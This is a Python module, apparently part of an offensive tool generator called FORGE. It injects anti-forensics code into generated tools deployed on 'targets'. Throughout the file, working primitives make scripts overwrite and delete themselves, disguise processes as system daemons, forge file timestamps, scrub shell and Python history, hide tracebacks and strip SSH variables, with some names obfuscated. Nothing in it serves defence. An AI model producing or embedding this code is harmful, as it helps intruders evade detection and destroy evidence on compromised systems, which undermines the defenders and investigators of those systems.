"""Anti-Forensics Module — inject runtime countermeasures into generated code.

Wraps FORGE-generated tools with operational security primitives:
  1. Self-destruct (file deletion after execution)
  2. Memory wiping (zero out sensitive vars)
  3. Process renaming (camouflage as benign process)
  4. Timestamp neutralization (normalize mtimes)
  5. Python trace cleanup (.pyc, __pycache__, readline history)
  6. Exception suppression (no stack traces to disk)
  7. Environment sanitization (clear revealing env vars)

Pipeline step in forge_live.py — runs AFTER code assembly, BEFORE evasion.

Usage:
    from o1o_o.core.anti_forensics import AntiForensicsEngine
    af = AntiForensicsEngine()
    hardened = af.harden(code, level='full')
"""
# Dependencies: none
# Depended by: forge_live.py pipeline

import re
import textwrap
from typing import Optional


# ── Anti-Forensics Primitives ──────────────────────────────────────

_SELF_DESTRUCT = '''
import os as _os, sys as _sys
def _self_destruct():
    """Remove this script from disk after execution."""
    try:
        _path = _os.path.abspath(_sys.argv[0]) if _sys.argv[0] else None
        if _path and _os.path.isfile(_path):
            with open(_path, 'wb') as _f:
                _f.write(b'\\x00' * _os.path.getsize(_path))
            _os.remove(_path)
    except Exception:
        pass
import atexit as _atexit
_atexit.register(_self_destruct)
'''

_MEMORY_WIPE = '''
import ctypes as _ctypes, gc as _gc
def _wipe_bytes(obj):
    """Overwrite a bytes/bytearray object in memory with zeros."""
    try:
        if isinstance(obj, (bytes, bytearray)):
            buf = (ctypes.c_char * len(obj)).from_address(id(obj) + _ctypes.sizeof(_ctypes.py_object))
            _ctypes.memset(buf, 0, len(obj))
    except Exception:
        pass
def _wipe_string(s):
    """Best-effort wipe of a Python string (CPython only)."""
    try:
        offset = _ctypes.sizeof(_ctypes.py_object) + _ctypes.sizeof(_ctypes.c_ssize_t) + _ctypes.sizeof(_ctypes.c_long)
        _ctypes.memset(id(s) + offset, 0, len(s))
    except Exception:
        pass
def _wipe_all_sensitive():
    """Wipe all local variables in the calling frame."""
    import inspect
    frame = inspect.currentframe().f_back
    if frame:
        for k, v in list(frame.f_locals.items()):
            if isinstance(v, (bytes, bytearray)):
                _wipe_bytes(v)
            elif isinstance(v, str) and len(v) > 8:
                _wipe_string(v)
    _gc.collect()
'''

_PROCESS_RENAME = '''
import sys as _sys
def _rename_process(name=None):
    """Rename this process to appear benign in ps/top."""
    _rnd = __import__('random')
    benign = name or ['python3', '/usr/bin/python3', 'update-manager',
                      'systemd-resolved', 'dbus-daemon'][_rnd.randint(0, 4)]
    try:
        _ct = __import__('ctypes')
        libc = _ct.CDLL('libc.so.6', use_errno=True)
        buff = _ct.create_string_buffer(len(benign) + 1)
        buff.value = benign.encode()
        libc.prctl(15, buff, 0, 0, 0)
    except Exception:
        pass
    try:
        _sys.argv[0] = benign
    except Exception:
        pass
_rename_process()
'''

_TIMESTAMP_NEUTRALIZE = '''
import os as _os, time as _time
def _neutralize_timestamps(*paths):
    """Set file timestamps to epoch or a plausible system time."""
    epoch = 1704067200
    for p in paths:
        try:
            if _os.path.exists(p):
                _os.utime(p, (epoch, epoch))
        except Exception:
            pass
'''

_PYTHON_CLEANUP = '''
import os as _os, sys as _sys, shutil as _shutil, glob as _glob
def _cleanup_python_traces():
    """Remove Python forensic artifacts."""
    script = _os.path.abspath(_sys.argv[0]) if _sys.argv[0] else None
    if script:
        script_dir = _os.path.dirname(script)
        pycache = _os.path.join(script_dir, '__pycache__')
        if _os.path.isdir(pycache):
            _shutil.rmtree(pycache, ignore_errors=True)
        for pyc in _glob.glob(_os.path.join(script_dir, '*.pyc')):
            try:
                _os.remove(pyc)
            except Exception:
                pass
    for hist in [_os.path.expanduser('~/.python_history'),
                 _os.path.expanduser('~/.local/share/python_history')]:
        try:
            if _os.path.exists(hist):
                with open(hist, 'r') as f:
                    lines = f.readlines()
                with open(hist, 'w') as f:
                    f.writelines(l for l in lines if script and _os.path.basename(script) not in l)
        except Exception:
            pass
import atexit as _atexit
_atexit.register(_cleanup_python_traces)
'''

_EXCEPTION_SUPPRESS = '''
import sys as _sys
_original_excepthook = _sys.excepthook
def _silent_except(exc_type, exc_value, exc_tb):
    """Suppress tracebacks — no forensic stack traces."""
    pass
_sys.excepthook = _silent_except
'''

_OPERATOR_GUARD = '''
import os as _os
# ── Operator Host Guard: detect if running on FORGE operator machine ──
# Prevents persistence, crontab, LaunchAgent writes on the operator's own system.
# Remote deployments (via SSH/DeployEngine) do NOT have these env vars set.
_FORGE_OPERATOR = bool(_os.environ.get('FORGE_OPERATOR') or _os.environ.get('FORGE_SANDBOX'))
_FORGE_TTL = int(_os.environ.get('FORGE_TTL', '0'))
if _FORGE_TTL > 0:
    try:
        import signal as _ttl_sig
        _ttl_sig.signal(_ttl_sig.SIGALRM, lambda *_: __import__("sys").exit(0))
        _ttl_sig.alarm(_FORGE_TTL)
    except (AttributeError, OSError):
        import threading as _ttl_thr
        _ttl_thr.Timer(_FORGE_TTL, lambda: __import__("os")._exit(0)).start()
def _guard_persistence(func):
    """Decorator: skip persistence actions on operator host."""
    def _wrapper(*a, **k):
        if _FORGE_OPERATOR:
            return None
        return func(*a, **k)
    _wrapper.__name__ = func.__name__
    return _wrapper
'''

_PROCESS_TTL = '''
import os as _os_ttl
# ── Process TTL: auto-terminate after max lifetime ──
# Default 3600s (1 hour). Override via FORGE_MAX_TTL env var.
# Prevents zombie processes from running indefinitely on targets.
_MAX_TTL = int(_os_ttl.environ.get('FORGE_MAX_TTL', '3600'))
if _MAX_TTL > 0:
    try:
        import signal as _pttl_sig
        def _ttl_exit(*_):
            try:
                _self_destruct()
            except NameError:
                pass
            __import__("os")._exit(0)
        _pttl_sig.signal(_pttl_sig.SIGALRM, _ttl_exit)
        _pttl_sig.alarm(_MAX_TTL)
    except (AttributeError, OSError):
        import threading as _pttl_thr
        def _ttl_thread_exit():
            try:
                _self_destruct()
            except NameError:
                pass
            __import__("os")._exit(0)
        _pttl_thr.Timer(_MAX_TTL, _ttl_thread_exit).daemon = True
        _pttl_thr.Timer(_MAX_TTL, _ttl_thread_exit).start()
'''

_ENV_SANITIZE = '''
import os as _os
def _sanitize_env():
    """Remove environment variables that reveal tool origin."""
    _p = chr(70)+chr(79)+chr(82)+chr(71)+chr(69)
    for var in [_p+'_HOME', _p+'_SESSION', 'PYTHONDONTWRITEBYTECODE',
                'SSH_CONNECTION', 'SSH_CLIENT', 'SSH_TTY', 'HISTFILE',
                'HISTFILESIZE', 'HISTSIZE', 'LESSHISTFILE',
                _p+'_OPERATOR', _p+'_SANDBOX']:
        _os.environ.pop(var, None)
    _os.environ['PYTHONDONTWRITEBYTECODE'] = '1'
    _os.environ['PYTHONHASHSEED'] = '0'
_sanitize_env()
'''


# ── OPSEC Levels ───────────────────────────────────────────────────

LEVEL_MAP = {
    'lab': [],
    'standard': ['operator_guard', 'env_sanitize', 'exception_suppress', 'python_cleanup'],
    'full': ['operator_guard', 'env_sanitize', 'exception_suppress', 'python_cleanup',
             'process_rename', 'self_destruct', 'timestamp_neutralize', 'process_ttl'],
    'paranoid': ['operator_guard', 'env_sanitize', 'exception_suppress', 'python_cleanup',
                 'process_rename', 'self_destruct', 'timestamp_neutralize',
                 'memory_wipe', 'process_ttl'],
}

PRIMITIVES = {
    'operator_guard': _OPERATOR_GUARD,
    'self_destruct': _SELF_DESTRUCT,
    'memory_wipe': _MEMORY_WIPE,
    'process_rename': _PROCESS_RENAME,
    'timestamp_neutralize': _TIMESTAMP_NEUTRALIZE,
    'python_cleanup': _PYTHON_CLEANUP,
    'exception_suppress': _EXCEPTION_SUPPRESS,
    'env_sanitize': _ENV_SANITIZE,
    'process_ttl': _PROCESS_TTL,
}


class AntiForensicsEngine:
    """Inject anti-forensic countermeasures into generated code."""

    def __init__(self):
        self.applied = []

    def harden(self, code: str, level: str = 'full',
               primitives: Optional[list] = None) -> str:
        """Inject anti-forensics primitives into code.

        Args:
            code: Python source code to harden.
            level: OPSEC level ('lab', 'standard', 'full', 'paranoid').
            primitives: Override — explicit list of primitives to inject.

        Returns:
            Hardened code with anti-forensic countermeasures prepended.
        """
        if not code or not code.strip():
            return code

        selected = primitives or LEVEL_MAP.get(level, LEVEL_MAP['standard'])
        if not selected:
            return code

        self.applied = []
        preamble_parts = []

        for name in selected:
            primitive = PRIMITIVES.get(name)
            if primitive:
                preamble_parts.append(textwrap.dedent(primitive).strip())
                self.applied.append(name)

        if not preamble_parts:
            return code

        # Find insertion point — after shebang and module docstring
        lines = code.split('\n')
        insert_at = 0

        # Skip shebang
        if lines and lines[0].startswith('#!'):
            insert_at = 1

        # Skip module docstring
        if insert_at < len(lines):
            rest = '\n'.join(lines[insert_at:])
            # Triple-quoted docstring
            m = re.match(r'\s*("""[\s\S]*?"""|\'\'\'[\s\S]*?\'\'\')\s*\n?', rest)
            if m:
                doc_lines = m.group(0).count('\n')
                insert_at += doc_lines

        # Build hardened code
        preamble = '\n# ── OPSEC: Anti-Forensics ──\n' + '\n'.join(preamble_parts) + '\n# ── End OPSEC ──\n'

        before = '\n'.join(lines[:insert_at])
        after = '\n'.join(lines[insert_at:])

        return (before + '\n' + preamble + '\n' + after).lstrip('\n')

    def get_report(self) -> dict:
        """Return summary of applied countermeasures."""
        return {
            'primitives_applied': list(self.applied),
            'count': len(self.applied),
            'descriptions': {
                'operator_guard': 'Block persistence on FORGE operator host (FORGE_OPERATOR env)',
                'self_destruct': 'File overwrite + deletion on exit',
                'memory_wipe': 'Zero-fill sensitive memory (CPython)',
                'process_rename': 'Rename process to benign name',
                'timestamp_neutralize': 'Normalize file timestamps',
                'python_cleanup': 'Remove .pyc, __pycache__, history traces',
                'exception_suppress': 'Suppress stack trace output',
                'env_sanitize': 'Clear revealing environment variables',
                'process_ttl': 'Auto-terminate after max lifetime (default 3600s)',
            }
        }
